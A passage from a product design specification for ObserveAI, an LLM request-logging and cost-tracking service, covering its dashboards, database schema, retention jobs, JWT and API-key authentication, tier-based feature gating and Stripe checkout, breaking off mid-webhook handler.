    gpt-3.5-turbo:  800 requests,  $255.44

Daily cost trend:
  SELECT 
    DATE(timestamp) as date,
    SUM(totalCost) as daily_cost
  FROM requests
  WHERE projectId = 'proj_123'
    AND timestamp >= NOW() - INTERVAL '30 days'
  GROUP BY DATE(timestamp)
  ORDER BY date ASC
  
  Result:
    2024-02-01: $15.23
    2024-02-02: $18.45
    ...`

---

# 5. Core Features Implementation Specifications

## 5.1 Feature: Request Logging & Tracking

`ARCHITECTURE PATTERN: Event Sourcing + Query Optimization
═══════════════════════════════════════════════════════════

DATA CAPTURED PER REQUEST:
┌─────────────────────────────────────┐
│ Request Record                      │
├─────────────────────────────────────┤
│ • ID (unique)                       │
│ • Project ID (foreign key)          │
│ • Timestamp                         │
│ • Provider (openai/anthropic)       │
│ • Model (gpt-4, claude-3-sonnet)    │
│ • Prompt tokens (count)             │
│ • Completion tokens (count)         │
│ • Total cost (calculated)           │
│ • Latency (milliseconds)            │
│ • Status (success/error)            │
│ • Error message (if failed)         │
│ • Error type (timeout/rate_limit)   │
│ • Full prompt (TEXT)                │
│ • Full response (TEXT)              │
│ • User ID (optional metadata)       │
│ • Session ID (optional metadata)    │
│ • Endpoint (optional metadata)      │
└─────────────────────────────────────┘

CONVERSATION THREADING:
═══════════════════════════════════════════════════════════

Users can group requests by sessionId:

Frontend query:
  GET /api/requests?sessionId=sess_456
  
Shows all requests in that conversation thread

Display pattern:
  [Conversation View]
    User: "Hello"
      ↓ AI response (150ms, $0.002)
    AI: "Hi! How can I help?"
      ↓ User followup
    User: "Tell me about AI"
      ↓ AI response (1200ms, $0.045)
    AI: "AI stands for..."

DISPLAY FEATURES:
═══════════════════════════════════════════════════════════

List View (Table):
┌─────────────────────────────────────────────────────────┐
│ Time          Model    Tokens    Cost      Latency Status│
├─────────────────────────────────────────────────────────┤
│ 2 min ago     gpt-4    234       $0.034    1.2s    ✓    │
│ 5 min ago     gpt-4    456       $0.067    0.8s    ✓    │
│ 8 min ago     gpt-3.5  123       $0.001    0.4s    ✓    │
│ 10 min ago    gpt-4    789       $0.112    2.1s    ✗    │
└─────────────────────────────────────────────────────────┘

Filters:
  • Date range picker
  • Model selector (all/gpt-4/gpt-3.5/claude)
  • Status (all/success/error)
  • Search prompt content

Detail View:
  [Request #12345]
    
    Timestamp: 2024-02-09 14:23:45 UTC
    Model: gpt-4
    Status: Success ✓
    
    Tokens:
      Prompt: 145
      Completion: 89
      Total: 234
    
    Cost: $0.0345
    Latency: 1,245ms
    
    Prompt:
    ┌─────────────────────────────┐
    │ What is artificial          │
    │ intelligence?               │
    └─────────────────────────────┘
    [Copy]
    
    Response:
    ┌─────────────────────────────┐
    │ Artificial intelligence     │
    │ (AI) is the simulation of   │
    │ human intelligence...       │
    └─────────────────────────────┘
    [Copy]
    
    Metadata:
      User ID: user_123
      Session ID: sess_456
      Endpoint: /api/chat`

## 5.2 Feature: Cost Tracking

`MULTI-LEVEL COST ANALYSIS
═══════════════════════════════════════════════════════════

LEVEL 1: Real-time Per-Request
───────────────────────────────
Calculated instantly when request logged
Stored in database with request

LEVEL 2: Daily Aggregation
───────────────────────────
Query pattern:
  SELECT 
    DATE(timestamp) as date,
    SUM(totalCost) as cost
  FROM requests
  WHERE projectId = ?
    AND timestamp >= ?
  GROUP BY DATE(timestamp)

LEVEL 3: Model Breakdown
───────────────────────────────
Query pattern:
  SELECT 
    model,
    COUNT(*) as count,
    SUM(totalCost) as cost,
    AVG(totalCost) as avg_cost
  FROM requests
  WHERE projectId = ?
  GROUP BY model

LEVEL 4: User/Session Breakdown
───────────────────────────────
Query pattern:
  SELECT 
    userId,
    COUNT(*) as requests,
    SUM(totalCost) as total_cost
  FROM requests
  WHERE projectId = ?
    AND userId IS NOT NULL
  GROUP BY userId
  ORDER BY total_cost DESC

DASHBOARD WIDGETS:
═══════════════════════════════════════════════════════════

[Cost Overview Card]
  Total Cost (30 days)
  $567.89
  
  +12% from last month

[Cost Timeline Chart]
  Line chart showing daily cost for past 30 days
  X-axis: Dates
  Y-axis: Cost ($)

[Cost by Model (Pie Chart)]
  gpt-4: $312.45 (55%)
  gpt-3.5-turbo: $255.44 (45%)

[Top 10 Expensive Requests]
  Request ID    Model    Cost      Date
  req_789       gpt-4    $1.23     Feb 9
  req_456       gpt-4    $0.98     Feb 8
  ...

[Monthly Projection]
  Current spending: $18.56/day
  Projected month total: $558.00
  
  Your plan allows: Unlimited spending
  (Cost is for info only, no limits)

EXPORT FUNCTIONALITY (STARTER+):
═══════════════════════════════════════════════════════════

User clicks "Export CSV"
      ↓
Frontend calls: GET /api/requests/export?projectId=X&dateFrom=Y&dateTo=Z
      ↓
Backend checks:
  • User tier >= STARTER? 
  • Yes → Generate CSV
  • No → Return 403 with upgrade prompt
      ↓
Generate CSV:
  Request ID, Timestamp, Model, Tokens, Cost, Status, ...
  req_123, 2024-02-09 14:23:45, gpt-4, 234, 0.0345, success, ...
  req_124, 2024-02-09 14:25:12, gpt-4, 456, 0.0678, success, ...
      ↓
Return as downloadable file`

## 5.3 Feature: Tool & API Call Tracking (STARTER+)

`TOOL CALL ARCHITECTURE
═══════════════════════════════════════════════════════════

WHEN AI USES FUNCTIONS/TOOLS:

OpenAI response with tool calls:
{
  choices: [{
    message: {
      role: "assistant",
      content: null,
      tool_calls: [
        {
          id: "call_abc123",
          function: {
            name: "get_weather",
            arguments: '{"location":"San Francisco"}'
          }
        }
      ]
    }
  }],
  usage: {...}
}

SDK extracts tool calls:
  [
    {
      name: "get_weather",
      input: '{"location":"San Francisco"}',
      output: null,  // To be filled by user
      status: "called"
    }
  ]

Sends to backend as part of request log

Backend stores in tool_calls table:
  • Request ID (foreign key)
  • Tool name
  • Tool input (JSON)
  • Tool output (JSON) - if provided
  • Latency (if provided)
  • Status (called/success/error)

DISPLAY IN UI:
═══════════════════════════════════════════════════════════

Request Detail View:
  [Request #12345]
    ...regular fields...
    
    🔧 Tool Calls (2):
    
    1. get_weather
       Input: {"location": "San Francisco"}
       Output: {"temp": 68, "condition": "sunny"}
       Latency: 234ms
       Status: Success ✓
    
    2. search_database
       Input: {"query": "AI companies"}
       Output: [{"name": "OpenAI"}, ...]
       Latency: 567ms
       Status: Success ✓

Tool Analytics Page (STARTER+):
═══════════════════════════════════════════════════════════

[Tool Usage Overview]
  
  Total tool calls: 1,450
  Success rate: 97%
  
  [Top Tools by Usage]
  Tool Name          Calls    Success   Avg Latency
  search_database    890      98%       345ms
  get_weather        345      100%      120ms
  send_email         215      95%       890ms
  
  [Tool Performance Chart]
  Line chart showing calls per day for each tool
  
  [Failed Tool Calls]
  Date       Tool            Error
  Feb 9      send_email      SMTP timeout
  Feb 8      search_database Connection refused`

## 5.4 Feature: Error Detection

`ERROR CLASSIFICATION SYSTEM
═══════════════════════════════════════════════════════════

SDK Error Handling:
  try {
    response = await openai.chat.completions.create(...)
  } catch (error) {
    errorType = classifyError(error)
    // Classify into: timeout, rate_limit, api_error, etc.
  }

Error Classification Logic:
  if (error.status === 429)
    → 'rate_limit'
  else if (error.code === 'ETIMEDOUT')
    → 'timeout'
  else if (error.status >= 500)
    → 'server_error'
  else if (error.status === 400)
    → 'invalid_request'
  else
    → 'api_error'

Stored in database:
  requests.status = 'error'
  requests.errorType = 'rate_limit'
  requests.errorMessage = "Rate limit exceeded"

ERROR MONITORING DASHBOARD:
═══════════════════════════════════════════════════════════

[Error Overview]
  Total errors (7 days): 23
  Error rate: 1.8%
  
  [Errors by Type]
  Pie chart:
    Timeout: 12 (52%)
    Rate limit: 8 (35%)
    API error: 3 (13%)
  
  [Error Timeline]
  Line chart showing errors per day
  
  [Recent Errors]
  Time       Model    Error Type     Message
  2 min ago  gpt-4    timeout        Request timeout
  5 min ago  gpt-4    rate_limit     Rate limit hit
  
  Click to see:
    → Full request details
    → What was being sent
    → Suggestions to fix

ERROR ALERT SYSTEM:
═══════════════════════════════════════════════════════════

Thresholds (configurable):
  • Error rate > 5% in 1 hour → Send alert
  • Same error 3+ times in 5 minutes → Send alert
  • Rate limit hit → Send immediate alert

Alert channels:
  • Email (all tiers)
  • Webhook (PRO+)
  • Slack integration (PRO+)`

## 5.5 Feature: Cost Optimization Suggestions (STARTER+)

`OPTIMIZATION ENGINE ARCHITECTURE
═══════════════════════════════════════════════════════════

AUTOMATED ANALYSIS (Runs periodically):

PATTERN 1: Model Overkill
───────────────────────────────
Analysis query:
  SELECT * FROM requests
  WHERE model = 'gpt-4'
    AND promptTokens < 100
    AND completionTokens < 50
  
If many short requests use expensive model:
  Suggestion:
    type: "model_downgrade"
    title: "Use GPT-3.5 for simple queries"
    description: "45% of your requests are under 150 tokens"
    affectedRequests: 560
    currentCost: $123.45
    potentialSavings: $98.76 (80% reduction)
    recommendation: "Switch to gpt-3.5-turbo for requests under 150 tokens"

PATTERN 2: Repeated Prompts
───────────────────────────────
Analysis query:
  SELECT prompt, COUNT(*) as occurrences
  FROM requests
  GROUP BY prompt
  HAVING COUNT(*) > 10
  
If same prompt appears many times:
  Suggestion:
    type: "enable_caching"
    title: "Cache repeated prompts"
    description: "You're sending identical prompts 230 times"
    examples: [
      "Summarize this document: ..." (45 times),
      "Translate to Spanish: ..." (38 times)
    ]
    potentialSavings: $67.50
    recommendation: "Implement response caching for repeated queries"

PATTERN 3: Verbose Prompts
───────────────────────────────
Analysis query:
  SELECT AVG(promptTokens) as avg_prompt_length
  FROM requests
  
If average > 500 tokens:
  Suggestion:
    type: "reduce_tokens"
    title: "Optimize prompt length"
    description: "Your average prompt is 789 tokens"
    currentCost: $234.56
    potentialSavings: $117.28 (if reduced to 400 tokens)
    recommendation: "Review system prompts for unnecessary verbosity"

PATTERN 4: Peak Usage Times
───────────────────────────────
If concentrated usage in certain hours:
  Suggestion:
    type: "rate_limiting"
    title: "Implement rate limiting"
    description: "80% of requests happen between 9am-11am"
    recommendation: "Spread load or implement queuing"

DISPLAY IN UI (STARTER+):
═══════════════════════════════════════════════════════════

[Optimization Page]
  
  💰 Total Potential Savings: $283.54/month
  
  [Suggestion Cards]
  
  ┌─────────────────────────────────────┐
  │ 💡 Use GPT-3.5 for simple queries   │
  ├─────────────────────────────────────┤
  │ Impact: High                        │
  │ Savings: $98.76/month               │
  │                                     │
  │ 45% of your GPT-4 requests could    │
  │ use the cheaper gpt-3.5-turbo model │
  │                                     │
  │ Affected: 560 requests              │
  │                                     │
  │ [Show Examples] [Dismiss]           │
  └─────────────────────────────────────┘
  
  ┌─────────────────────────────────────┐
  │ 🔄 Enable prompt caching            │
  ├─────────────────────────────────────┤
  │ Impact: Medium                      │
  │ Savings: $67.50/month               │
  │                                     │
  │ You're repeating 230 identical      │
  │ prompts. Cache responses to save.   │
  │                                     │
  │ [View Repeated Prompts] [Learn How] │
  └─────────────────────────────────────┘

FREE USER VIEW:
═══════════════════════════════════════════════════════════

[Optimization Page - Locked]
  
  🔒 Cost Optimization
  
  Available on STARTER plan ($19/month)
  
  What you'll get:
  ✓ Automated savings suggestions
  ✓ Model recommendations
  ✓ Caching opportunities
  ✓ Token usage analysis
  ✓ Estimated monthly savings
  
  Users typically save $50-200/month
  
  [Upgrade to STARTER]`

## 5.6 Feature: Simple Dashboard

`DASHBOARD LAYOUT & COMPONENTS
═══════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────┐
│ HEADER                                                   │
│ ┌───────────────────┐  ┌────────────┐  ┌─────────────┐ │
│ │ FREE Plan         │  │ My Chatbot │  │ [User Menu] │ │
│ │ 8,456 / 10,000    │  │ (dropdown) │  │             │ │
│ │ requests          │  └────────────┘  └─────────────┘ │
│ │ [Upgrade]         │                                   │
│ └───────────────────┘                                   │
├─────────────────────────────────────────────────────────┤
│ SIDEBAR       │ MAIN CONTENT                            │
│               │                                         │
│ Dashboard     │ [STATS CARDS - Row 1]                   │
│ Requests      │ ┌──────────┐ ┌──────────┐ ┌──────────┐ │
│ Cost          │ │📊 Requests│ │💰 Cost   │ │⚠️ Errors  │ │
│ Errors        │ │ Today     │ │ Today    │ │          │ │
│ 🔒Optimization│ │ 145       │ │ $5.23    │ │ 3        │ │
│ Settings      │ └──────────┘ └──────────┘ └──────────┘ │
│               │                                         │
│               │ [REQUEST TIMELINE - Chart]              │
│               │ ┌─────────────────────────────────────┐ │
│               │ │ Requests over time (24h)            │ │
│               │ │      ╱╲                             │ │
│               │ │     ╱  ╲    ╱╲                      │ │
│               │ │    ╱    ╲  ╱  ╲                     │ │
│               │ │___╱______╲╱____╲___                 │ │
│               │ │ 00:00  06:00  12:00  18:00  24:00   │ │
│               │ └─────────────────────────────────────┘ │
│               │                                         │
│               │ [COST CHART - 7 Days]                   │
│               │ ┌─────────────────────────────────────┐ │
│               │ │  Daily Cost                         │ │
│               │ │  █                                   │ │
│               │ │  █ █   █                            │ │
│               │ │  █ █ █ █ █                          │ │
│               │ │  █ █ █ █ █ █ █                      │ │
│               │ │  M T W T F S S                      │ │
│               │ └─────────────────────────────────────┘ │
│               │                                         │
│               │ [RECENT REQUESTS - Table]               │
│               │ ┌─────────────────────────────────────┐ │
│               │ │Time     Model  Tokens Cost   Status │ │
│               │ │2m ago   gpt-4  234    $0.03  ✓     │ │
│               │ │5m ago   gpt-4  456    $0.07  ✓     │ │
│               │ │8m ago   gpt-3.5 123   $0.00  ✓     │ │
│               │ │              [View All →]           │ │
│               │ └─────────────────────────────────────┘ │
└───────────────┴─────────────────────────────────────────┘

DATA REFRESH STRATEGY:
═══════════════════════════════════════════════════════════

Using React Query:
  queryKey: ['stats', projectId, dateRange]
  refetchInterval: 30000  (30 seconds)
  staleTime: 10000  (consider fresh for 10 seconds)

Every 30 seconds:
  • Refetch stats
  • Update charts
  • Refresh recent requests

User sees near-real-time updates without manual refresh

Only refetch when:
  • Tab is active (browser tab focus)
  • Project hasn't changed
  • User hasn't navigated away`

---

# 6. Database Architecture & Relationships

## 6.1 Complete Entity Relationship Diagram

`DATABASE SCHEMA & RELATIONSHIPS
═══════════════════════════════════════════════════════════

┌─────────────────────────────────────┐
│ USERS                               │
├─────────────────────────────────────┤
│ PK  id                              │
│     email (unique)                  │
│     passwordHash                    │
│     name                            │
│                                     │
│ Admin & Status:                     │
│     isAdmin (boolean)               │
│     isBanned (boolean)              │
│                                     │
│ Subscription:                       │
│     subscriptionTier                │
│       (FREE|STARTER|PRO|ENTERPRISE) │
│     subscriptionStatus              │
│       (active|past_due|canceled)    │
│                                     │
│ Stripe Integration:                 │
│     stripeCustomerId (unique)       │
│     stripeSubscriptionId (unique)   │
│                                     │
│ Usage Tracking:                     │
│     monthlyRequestCount (int)       │
│     monthlyRequestLimit (int)       │
│     requestResetDate (date)         │
│                                     │
│ Limits:                             │
│     projectLimit (int)              │
│                                     │
│ Downgrade Scheduling:               │
│     pendingDowngrade (boolean)      │
│     downgradeDate (date)            │
│     downgradeTo (tier)              │
│                                     │
│ Timestamps:                         │
│     createdAt                       │
│     updatedAt                       │
│     lastActiveAt                    │
└──────────────┬──────────────────────┘
               │ ONE-TO-MANY
               │
               ↓
┌─────────────────────────────────────┐
│ PROJECTS                            │
├─────────────────────────────────────┤
│ PK  id                              │
│     name                            │
│     apiKey (unique)                 │
│ FK  userId → users.id               │
│     isActive (boolean)              │
│     createdAt                       │
│     updatedAt                       │
└──────────────┬──────────────────────┘
               │ ONE-TO-MANY
               │
               ↓
┌─────────────────────────────────────┐
│ REQUESTS                            │
├─────────────────────────────────────┤
│ PK  id                              │
│ FK  projectId → projects.id         │
│     timestamp                       │
│                                     │
│ LLM Details:                        │
│     provider (string)               │
│     model (string)                  │
│                                     │
│ Token Usage:                        │
│     promptTokens (int)              │
│     completionTokens (int)          │
│     totalTokens (int)               │
│                                     │
│ Cost:                               │
│     totalCost (decimal 10,6)        │
│                                     │
│ Performance:                        │
│     latencyMs (int)                 │
│                                     │
│ Status:                             │
│     status (success|error)          │
│     errorMessage (text)             │
│     errorType (string)              │
│                                     │
│ Content:                            │
│     prompt (text)                   │
│     response (text)                 │
│                                     │
│ Metadata:                           │
│     userId (string) - client's user │
│     sessionId (string)              │
│     endpoint (string)               │
│     tags (array)                    │
└──────────────┬──────────────────────┘
               │ ONE-TO-MANY
               │
               ↓
┌─────────────────────────────────────┐
│ TOOL_CALLS                          │
├─────────────────────────────────────┤
│ PK  id                              │
│ FK  requestId → requests.id         │
│     timestamp                       │
│     toolName (string)               │
│     toolInput (text/json)           │
│     toolOutput (text/json)          │
│     latencyMs (int)                 │
│     status (string)                 │
│     errorMessage (text)             │
└─────────────────────────────────────┘

SUBSCRIPTION TRACKING:

┌─────────────────────────────────────┐
│ SUBSCRIPTION_HISTORY                │
├─────────────────────────────────────┤
│ PK  id                              │
│ FK  userId → users.id               │
│     event (upgraded|downgraded|     │
│            canceled|payment_failed) │
│     oldTier (tier enum)             │
│     newTier (tier enum)             │
│     reason (string)                 │
│     metadata (json)                 │
│     timestamp                       │
└─────────────────────────────────────┘

┌─────────────────────────────────────┐
│ INVOICES                            │
├─────────────────────────────────────┤
│ PK  id                              │
│ FK  userId → users.id               │
│     stripeInvoiceId (unique)        │
│     stripePaymentIntentId           │
│     amount (decimal 10,2)           │
│     currency (string)               │
│     status (paid|open|void)         │
│     createdAt                       │
│     paidAt                          │
│     dueDate                         │
│     invoiceUrl (string)             │
│     invoicePdf (string)             │
└─────────────────────────────────────┘

CASCADE DELETE BEHAVIOR:
═══════════════════════════════════════════════════════════

DELETE user
  ↓ CASCADE
DELETE all user's projects
  ↓ CASCADE
DELETE all requests in those projects
  ↓ CASCADE
DELETE all tool_calls in those requests

Also DELETE:
  • subscription_history for that user
  • invoices for that user

This prevents orphaned data!

INDEXING STRATEGY:
═══════════════════════════════════════════════════════════

users table:
  • INDEX on email (for login lookups)
  • INDEX on subscriptionTier (for analytics)
  • INDEX on stripeCustomerId (for webhook processing)

projects table:
  • INDEX on userId (get user's projects)
  • INDEX on apiKey (SDK authentication)

requests table:
  • COMPOSITE INDEX on (projectId, timestamp DESC)
    → Most common query: recent requests for project
  • INDEX on status (filter by success/error)
  • INDEX on (provider, model) (cost by model queries)
  • INDEX on timestamp DESC (time-based queries)
  • INDEX on sessionId (conversation threading)

tool_calls table:
  • INDEX on requestId (get tools for request)
  • INDEX on toolName (tool usage analytics)`

## 6.2 Data Retention Strategy

`DATA LIFECYCLE MANAGEMENT
═══════════════════════════════════════════════════════════

RETENTION POLICIES BY TIER:
  FREE:       7 days
  STARTER:    30 days
  PRO:        90 days
  ENTERPRISE: Custom (no auto-deletion)

AUTOMATED CLEANUP JOB:
═══════════════════════════════════════════════════════════

Runs: Daily at 02:00 UTC

Process:
  FOR EACH tier in [FREE, STARTER, PRO]:
    
    retentionDays = tier == FREE ? 7 :
                    tier == STARTER ? 30 :
                    tier == PRO ? 90 : 999999
    
    DELETE FROM requests
    WHERE projectId IN (
      SELECT id FROM projects
      WHERE userId IN (
        SELECT id FROM users
        WHERE subscriptionTier = tier
      )
    )
    AND timestamp < (NOW() - INTERVAL retentionDays DAYS)
    
    (tool_calls deleted automatically via CASCADE)

DOWNGRADE IMMEDIATE CLEANUP:
═══════════════════════════════════════════════════════════

When user downgrades from PRO → FREE:
  
  Immediately DELETE data older than 7 days
  (Don't wait for daily job)
  
  DELETE FROM requests
  WHERE projectId IN (user's projects)
    AND timestamp < (NOW() - INTERVAL '7 days')

BACKUP BEFORE DELETE (Optional):
═══════════════════════════════════════════════════════════

Before running cleanup:
  1. Export to S3/backup storage
  2. Keep for 90 days as safety net
  3. Allow users to request data recovery (paid service)`

---

# 7. Authentication & Authorization System

## 7.1 JWT Authentication Flow

`AUTH ARCHITECTURE PATTERN: Stateless JWT
═══════════════════════════════════════════════════════════

REGISTRATION FLOW:
──────────────────

Frontend: POST /api/auth/register
  Body: { email, password, name }
      ↓
Backend Controller:
  1. Validate input (Zod schema)
  2. Check if email exists:
     SELECT * FROM users WHERE email = ?
     If exists → 400 "Email already registered"
  
  3. Hash password:
     hash = bcrypt.hash(password, 10)  // 10 salt rounds
  
  4. Create user:
     INSERT INTO users (
       email, passwordHash, name,
       subscriptionTier, monthlyRequestLimit, projectLimit
     ) VALUES (
       email, hash, name,
       'FREE', 10000, 1
     )
  
  5. Generate JWT:
     token = jwt.sign(
       {
         userId: user.id,
         subscriptionTier: 'FREE'
       },
       JWT_SECRET,
       { expiresIn: '7d' }
     )
  
  6. Return:
     {
       user: { id, email, name, tier },
       token: "eyJhbGci..."
     }
      ↓
Frontend:
  • Store token in localStorage
  • Store user in Zustand state
  • Redirect to /dashboard

LOGIN FLOW:
──────────────────

Frontend: POST /api/auth/login
  Body: { email, password }
      ↓
Backend Controller:
  1. Find user:
     user = SELECT * FROM users WHERE email = ?
     If not found → 404 "User not found"
  
  2. Verify password:
     isValid = bcrypt.compare(password, user.passwordHash)
     If not valid → 401 "Invalid credentials"
  
  3. Check if banned:
     If user.isBanned → 403 "Account suspended"
  
  4. Generate JWT (same as registration)
  
  5. Return user + token
      ↓
Frontend: Same as registration

AUTHENTICATED REQUESTS:
══════════════════════════════════════════════════════════

Frontend makes API call:
  GET /api/projects
  Headers: {
    Authorization: "Bearer eyJhbGci..."
  }
      ↓
Backend Middleware (authenticate):
  1. Extract token:
     authHeader = req.headers.authorization
     if (!authHeader) → 401 "No token"
     
     token = authHeader.split(' ')[1]  // "Bearer <token>"
  
  2. Verify token:
     try {
       decoded = jwt.verify(token, JWT_SECRET)
       // decoded = { userId, subscriptionTier, iat, exp }
     } catch {
       → 401 "Invalid/expired token"
     }
  
  3. Fetch fresh user data:
     user = SELECT * FROM users WHERE id = decoded.userId
     if (!user) → 401 "User not found"
     if (user.isBanned) → 403 "Account banned"
  
  4. Attach to request:
     req.user = user
     req.userId = user.id
  
  5. Continue to next middleware/controller

TOKEN EXPIRY:
══════════════════════════════════════════════════════════

Tokens expire after 7 days

When expired:
  Backend returns: 401 "Token expired"
      ↓
  Frontend catches error
      ↓
  Clear localStorage
  Clear Zustand state
  Redirect to /login
      ↓
  User must log in again

REFRESH TOKEN PATTERN (Optional Future Enhancement):
══════════════════════════════════════════════════════════

Could implement refresh tokens for better UX:
  • Access token: 15 minutes
  • Refresh token: 7 days
  
When access token expires:
  Use refresh token to get new access token
  No need to log in again

Not implemented in MVP to keep it simple`

## 7.2 API Key Authentication (SDK)

`SDK AUTHENTICATION PATTERN
═══════════════════════════════════════════════════════════

API KEY FORMAT:
  obs_[32 random alphanumeric characters]
  Example: obs_k3j8h2g9f4d7s6a1p0m9n8b7v6c5x4z

GENERATION:
  When user creates project:
    apiKey = 'obs_' + randomBytes(24).toString('base64url')
    
  Stored in projects.apiKey (unique index)

SDK USAGE:
  const observed = ObserveAI.wrap(openai, {
    apiKey: 'obs_k3j8h2g9...'
  })

SDK SENDS REQUEST:
  POST /api/sdk-log
  Headers: {
    X-API-Key: obs_k3j8h2g9...
  }
      ↓
Backend Middleware (validateApiKey):
  1. Extract key:
     apiKey = req.headers['x-api-key']
     if (!apiKey) → 401 "API key required"
  
  2. Look up project:
     project = SELECT * FROM projects
               WHERE apiKey = ?
               INCLUDE user
     
     if (!project) → 401 "Invalid API key"
  
  3. Check project active:
     if (!project.isActive) → 403 "Project disabled"
  
  4. Check user status:
     if (user.isBanned) → 403 "Account suspended"
     if (user.subscriptionStatus != 'active') 
       → 402 "Payment required"
  
  5. Attach to request:
     req.project = project
     req.user = user
  
  6. Continue to usage limiter middleware

API KEY ROTATION:
══════════════════════════════════════════════════════════

User clicks "Regenerate API Key":
  Frontend: POST /api/projects/:id/regenerate-key
      ↓
  Backend:
    1. Generate new key
    2. UPDATE projects SET apiKey = newKey WHERE id = ?
    3. Return new key
    4. OLD key immediately invalid
      ↓
  User must update SDK with new key

Security benefit:
  • If key leaked, can rotate immediately
  • Old key becomes useless

RATE LIMITING (Per API Key):
══════════════════════════════════════════════════════════

Middleware: rateLimiter
  
  Store in memory (Redis in production):
    key: apiKey
    value: request count
    expiry: 1 minute
  
  On each request:
    count = get(apiKey)
    if (count > 1000) → 429 "Too many requests"
    
    increment(apiKey)
    expire(apiKey, 60)  // Reset after 1 minute

Limits:
  • 1000 requests per minute per API key
  • Prevents abuse
  • Doesn't count toward monthly usage limit`

## 7.3 Feature Authorization

`FEATURE GATING ARCHITECTURE
═══════════════════════════════════════════════════════════

FEATURE MATRIX (Backend Constants):
{
  'request_logging': {
    tiers: ['FREE', 'STARTER', 'PRO', 'ENTERPRISE'],
    description: 'View request logs'
  },
  'cost_tracking_basic': {
    tiers: ['FREE', 'STARTER', 'PRO', 'ENTERPRISE'],
    description: 'Basic cost analytics'
  },
  'cost_optimization': {
    tiers: ['STARTER', 'PRO', 'ENTERPRISE'],
    description: 'Cost saving suggestions'
  },
  'tool_tracking': {
    tiers: ['STARTER', 'PRO', 'ENTERPRISE'],
    description: 'Tool/API call monitoring'
  },
  'export_csv': {
    tiers: ['STARTER', 'PRO', 'ENTERPRISE'],
    description: 'Export data to CSV'
  },
  'advanced_analytics': {
    tiers: ['PRO', 'ENTERPRISE'],
    description: 'Advanced analytics dashboard'
  },
  'api_access': {
    tiers: ['PRO', 'ENTERPRISE'],
    description: 'Programmatic API access'
  },
  'webhooks': {
    tiers: ['PRO', 'ENTERPRISE'],
    description: 'Webhook integrations'
  },
  'sso': {
    tiers: ['ENTERPRISE'],
    description: 'SSO/SAML authentication'
  }
}

FUNCTION: canAccessFeature(userTier, feature)
  allowedTiers = FEATURE_MATRIX[feature].tiers
  return allowedTiers.includes(userTier)

MIDDLEWARE USAGE:
══════════════════════════════════════════════════════════

Route definition:
  GET /api/optimization
  Middleware: authenticate  (check if logged in)
  Middleware: requireFeature('cost_optimization')
  Controller: getOptimizationSuggestions

requireFeature Middleware:
  function requireFeature(featureName) {
    return (req, res, next) => {
      user = req.user  // Set by authenticate middleware
      
      hasAccess = canAccessFeature(
        user.subscriptionTier,
        featureName
      )
      
      if (!hasAccess) {
        minimumTier = FEATURE_MATRIX[featureName].tiers[0]
        
        return res.status(403).json({
          error: "FEATURE_LOCKED",
          message: `This feature requires ${minimumTier} plan`,
          feature: featureName,
          currentPlan: user.subscriptionTier,
          upgradeUrl: "/upgrade"
        })
      }
      
      next()  // User has access, continue
    }
  }

FRONTEND GATING:
══════════════════════════════════════════════════════════

Custom Hook: useFeatureAccess(featureName)
  user = useAuthStore(state => state.user)
  
  hasAccess = canAccessFeature(user.subscriptionTier, featureName)
  minimumPlan = FEATURE_MATRIX[featureName].tiers[0]
  
  return {
    hasAccess,
    minimumPlan,
    showUpgrade: !hasAccess
  }

Component Usage:
  function OptimizationPage() {
    const { hasAccess, minimumPlan } = useFeatureAccess('cost_optimization')
    
    if (!hasAccess) {
      return <FeatureLockedScreen minimumPlan={minimumPlan} />
    }
    
    return <OptimizationDashboard />
  }

Navigation:
  <NavItem 
    to="/optimization" 
    label="Optimization"
    feature="cost_optimization"
  />
  
  // If FREE user → Shows "🔒 STARTER" badge
  // Clicking opens upgrade modal instead of navigating`

---

# 8. Payment Integration Architecture

## 8.1 Stripe Integration Pattern

`STRIPE CONFIGURATION
═══════════════════════════════════════════════════════════

PRODUCTS & PRICES (Created in Stripe Dashboard):

Product: "ObserveAI Starter"
  Price: $19/month (recurring)
  Price ID: price_starter_monthly_123

Product: "ObserveAI Pro"
  Price: $49/month (recurring)
  Price ID: price_pro_monthly_456

Environment Variables:
  STRIPE_SECRET_KEY=sk_test_...
  STRIPE_PUBLISHABLE_KEY=pk_test_...
  STRIPE_WEBHOOK_SECRET=whsec_...
  STRIPE_PRICE_ID_STARTER=price_starter_monthly_123
  STRIPE_PRICE_ID_PRO=price_pro_monthly_456

CHECKOUT FLOW (Complete):
═══════════════════════════════════════════════════════════

User clicks "Upgrade to STARTER"
      ↓
Frontend: POST /api/subscriptions/create-checkout
  Body: { planId: 'STARTER' }
      ↓
Backend Controller:
  1. Get or create Stripe customer:
     if (!user.stripeCustomerId) {
       customer = stripe.customers.create({
         email: user.email,
         metadata: { userId: user.id }
       })
       
       UPDATE users SET 
         stripeCustomerId = customer.id
       WHERE id = user.id
     }
  
  2. Get price ID:
     priceId = planId == 'STARTER' 
       ? process.env.STRIPE_PRICE_ID_STARTER
       : process.env.STRIPE_PRICE_ID_PRO
  
  3. Create checkout session:
     session = stripe.checkout.sessions.create({
       customer: user.stripeCustomerId,
       payment_method_types: ['card'],
       line_items: [{
         price: priceId,
         quantity: 1
       }],
       mode: 'subscription',
       success_url: `${FRONTEND_URL}/upgrade/success?session_id={CHECKOUT_SESSION_ID}`,
       cancel_url: `${FRONTEND_URL}/upgrade?canceled=true`,
       metadata: {
         userId: user.id,
         planId: planId
       }
     })
  
  4. Return session:
     {
       sessionId: session.id,
       checkoutUrl: session.url
     }
      ↓
Frontend:
  Redirect to session.url (Stripe hosted page)
      ↓
Stripe Checkout Page:
  User enters card details
  User clicks "Subscribe"
      ↓
Stripe processes payment
      ↓
If successful:
  Stripe sends webhook: checkout.session.completed
      ↓
Backend receives: POST /webhooks/stripe
  {
    type: "checkout.session.completed",
    data: {
      object: {
        id: "cs_...",
        customer: "cus_...",
        subscription: "sub_...",
        metadata: {
          userId: "user_123",
          planId: "STARTER"
        }
      }
    }
  }
      ↓
Webhook Handler:
  1. Verify signature:
     event = stripe.webhooks.constructEvent(
       rawBody,
       signature,
       WEBHOOK_SECRET
     )
  
  2. Process event:
     session = event.data.object
     userId = session.metadata.userId
     planId = session.metadata.planId
     
     planDetails = {
       'STARTER': {
         tier: 'STARTER',
         requestLimit: 100000,
         projectLimit: 5
       },
       'PRO': {
         tier: 'PRO',
         requestLimit: 1000000,
         projectLimit: 999999  // Unlimited
       }
     }
     
     plan = planDetails[planId]
  
  3. Update user:
     UPDATE users SET
       subscriptionTier = plan.tier,
       subscriptionStatus = 'active',
